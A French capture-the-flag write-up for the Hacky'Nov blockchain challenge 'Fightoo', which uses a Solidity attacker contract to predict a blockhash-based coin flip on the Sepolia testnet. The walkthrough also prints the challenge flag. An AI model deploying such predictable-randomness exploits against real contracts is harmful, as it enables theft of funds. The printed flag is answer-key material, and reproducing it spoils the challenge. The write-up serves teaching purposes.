<div align="center">
  <a href="https://hackynov.fr"><img src="./img/Logo+Texte-Hacky&apos;Nov-Depths-White.svg" alt="Hacky'Nov" width="50%"></a>
</div>

## Contexte

Les challenges Blockchain se déploient et se vérifient sur une autre plateforme qui ressemble à ça :

![Accueil](./img/fond-plateforme.png)

**La description du challenge :**

```
Vous allez devoir parier sur des combats et gagner 10 fois d'affilé ! Vous avez intérêt à être très chanceux ...

Vous utiliserez le réseau de test Sepolia pour faire vos challenges.
```

| Nom du challenge | Catégorie  | Nombre de points | Nombre de résolution |
| ---------------- | ---------- | ---------------- | -------------------- |
| Fightoo          | Blockchain | 200              | 3                    |

## Déploiement du challenge

La première étape avant de se lancer dans la résolution de `Fightoo` est de connecter son wallet à la plateforme. Il suffit d'avoir un wallet à disposition (par exemple <a href="https://metamask.io/">Metamask</a>) et de quelques **$ETH** de test sur le réseau **Sepolia**. (que vous pouvez récupérer gratuitement sur des faucet comme <a href="https://www.alchemy.com/faucets/ethereum-sepolia">Alchemy</a> ou <a href="https://www.infura.io/faucet/sepolia">Infura</a>)

Un fois cela fait, vous pouvez cliquer sur le bouton `CONNECT` en haut à droite et connecter votre wallet.

Vous pouvez à présent cliquer plus sur le bouton `DÉPLOYER UNE INSTANCE DU CONTRAT` qui aura pour effet de déployer une instance spécialement pour vous. Son adresse s'affichera sur la page et dans la console une fois la transaction traîtée.

Quand vous pensez avoir réussi le challenge, cliquer sur `VÉRIFIER L'INSTANCE`. Vous devrez alors valider deux transactions et si vous avez bel et bien réussi, alors le flag s'affichera sur la page et dans la console.

Introduction terminée, passons à la résolution du challenge !

## Solution

Après avoir déployé votre instance du contrat, nous allons récupérer son adresse et son code pour le charger dans notre éditeur <a href="https://remix.ethereum.org/">Remix IDE</a>

![Etape1](./img/Etape1.png)

On connecte bien son wallet sur Remix en utilisant l'environnement de déploiement `"Injected Provider"` et on se met sur le réseau de test Sepolia.
On compile le code du contrat à pirater et on colle l'adresse de notre instance dans la partie `At Address` en bas à gauche. On clique ensuite sur ce m^me bouton pour charger notre instance et intéragir avec.

![Remix1](./img/remix1.png)

Il s'affiche ensuite en dessous dans la partie `Deployed Contracts`.
Le but est de gagner 10 fois d'affilé son pari de combat.

### Analyse du code

Nous devons miser soit sur `0` soit sur `1`. Si nous gagnons 10 fois d'affilé, nous pouvons réupérer le flag.

Il faudrait soit avoir énormément de chance, soit faire preuve d'ingéniosité :D

Nous allons utiliser un smart contract pour appeler les fonctions de paris et nous permettre de gagner à tous les coups.

### Exploitation

En analysant comment le contrat calcule le gagnant, nous allons l'implémenter dans un autre contrat qui fera lui-même le calcule à notre place :

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFightoo {
    function wins(bool _guess) external returns (bool);
}

contract FightooSolution {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    // Renseigner l'adresse du contrat que vous avez déployé :
    IFightoo target = IFightoo(0x6aD388aDeE2cACf67D66F3f49D8384d767e2F056);

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 FightResult = uint256(uint256(blockValue) / FACTOR);
        bool winner = FightResult == 1 ? true : false;

        target.wins(winner);
    }
}
```

A chaque fois que nous allons appeler notre fonction `attack()`, nous allons faire une mise gagnante. Appeler cette fonction 10 fois et l'on pourra voir que nous avons 10 victoires consécutives.

Nous pouvons aller demander le flag !

### Envoi de l'instance pour vérification

Nous avons atteint l'objectif, c'est à dire devenir owner du contrat, nous pouvons donc retourner sur la plateforme pour faire vérifier notre instance.
Il suffit de cliquer sur le bouton `VÉRIFIER L'INSTANCE` et de valider les deux transactions qui vont apparaître.
Si tout est bon, alors le flag s'affichera sur la page et dans la console.

**BRAVO !**

FLAG : **HN0x03{H4v3u1cH4Nc3_0uToFTw0?}**
